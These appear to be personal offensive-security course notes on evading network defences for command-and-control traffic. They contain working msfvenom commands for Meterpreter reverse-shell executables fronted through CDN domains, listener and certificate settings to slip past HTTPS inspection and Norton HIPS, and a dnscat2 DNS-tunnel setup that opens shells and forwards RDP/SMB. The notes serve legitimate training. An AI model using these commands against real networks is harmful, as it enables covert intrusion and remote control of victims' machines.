    1. DNS Filters
        //blocklists can result in dropped traffic or sinkholed traffic
            ex. with OpenDNS:  sudo bash -c "echo nameserver 208.67.222.222 > /etc/resolv.conf"; nslookup www.internetbadguys.com
        //domain reputation can be used - check w/ IPVoid; or categories can be used - check w/ OpenDNS or Symantec category checker
        //pick something that's aged and appears legitimate w/ some legit content
    2. Web Proxies
        //MITM that can perform URL and IP filtering and HTTPS inspection; will likely log stuff
        //can actively modify data - http headers, etc. or block certain user-agents
        //To Bypass:
            **ensure that payload is proxy-aware (Meterpreter is)
            ensure that traffic on 80/443 follows http standards, not custom tcp
            set User-Agent to one that is permitted by the org - set HttpUserAgent in Meterpreter
    3. IDS and IPS Sensors
        //perform deep packet inspection and reassemble fragmented traffic, comparing against signatures
        //bypass by altering traffic patterns
        ex. bypassing Norton HIPS (part of Norton 360/Symantec Endpoint Protection) detection of Meterpreter https certificate
            //one option - get real ssl cert, not self-signed
            //can create custom self-signed w/ Metasploit's impersonate_ssl module, or w/ openssl
            //**Openssl method:  
                openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
                cat priv.key cert.crt > nasa.pem
                //In /etc/ssl/openssl.cnf:  change CipherString=DEFAULT@SECLEVEL=2 to CipherString=DEFAULT
                //MSF:  set HandlerSSLCert /home/kali/Desktop/OSEP/self_cert/nasa.pem
    4. Full Packet Capture Devices
        //network taps - ex. Netwitness, Moloch - used for post-attack analysis
        //goal: blend in and lower profile - use a good C2 IP geo, etc.
    5. HTTPS Inspection
        //usually on a dedicated device - high resource
        //**Certificate pinning in Meterpreter - set StagerVerifySSLCert true, and set HandlerSSLCert
            //will abort connection if certs don't match
        //some site categories (like banking) won't be inspected
    6. Domain Fronting
        //bypass technique for multiple systems; powered by CDNs
        //background:
            vhosts, host headers
            TLS Server Name Indication (SNI) field in the TLS Client Hello tells the server what certificate to use
            CDNs serve content based on the Host header
        ex. make an HTTPS connection to a server and set the SNI to indicate that we are accessing www.example1.com. Once the TLS session is established and we start the HTTP session (over TLS), we can specify a different domain name in the Host header, for example www.example2.com. This will cause the webserver to serve content for that website instead. If our target is not performing HTTPS inspection, it will only see the initial connection to www.example1.com, unaware that we were connecting to www.example2.com
        //works by establishing a connection to a good site hosted by a cdn, then once TLS is established, changing the Host header to point to the malicious site hosted by the same CDN - so traffic looks like it's going to the good site
            //FindFrontableDomains script - finds domains hosted on the same CDN - you don't have to control the frontable one, just change the header!
            ex. test:  curl --header "Host: offensive-security.azureedge.net" http://do.skype.com - check http and https
            MSF:  msfvenom -p windows/x64/meterpreter/reverse_http LHOST=do.skype.com LPORT=80 HttpHostHeader=offensive-security.azureedge.net -f exe > http-df.exe
            Listener:  set LHOST do.skype.com; set OverrideLHOST do.skype.com; set OverrideRequestHost true; set HttpHostHeader offensive-security.azureedge.net
        //Fine as long as there's no HTTPS inspection!
        ex. in lab:  msfvenom -p windows/x64/meterpreter_reverse_https HttpHostHeader=cdn123.offseccdn.com LHOST=good.com LPORT=443 -f exe > https-df.exe
    7. *DNS Tunneling
        //way to bypass proxy, IPS, and firewall rules
        //you must control both ends of the communication - register a DNS server for a target domain (w/ NS record)
        //client can only encapsulate data as subdomains; server can return data in various fields
        //client must continuously beacon back
        //Tool: dnscat2
            //Setup - pick target domain to use (ex. *.tunnel.com), and ensure DNS server points to you:
                /etc/dnsmasq.conf:
                    server=/tunnel.com/<kaliIP>
                    server=/somedomain.com/<kaliIP>
                systemctl restart dnsmasq
            //Server Usage:
                dnscat2-server tunnel.com; then use provided command on client/target (must have dnscat.exe)
                session -i 1; shell; session -i 2
                **can add tunnels too! - ex.  listen 127.0.0.1:3389 172.16.51.21:3389
                    ** use for tunneling SMB, RDP, etc.!!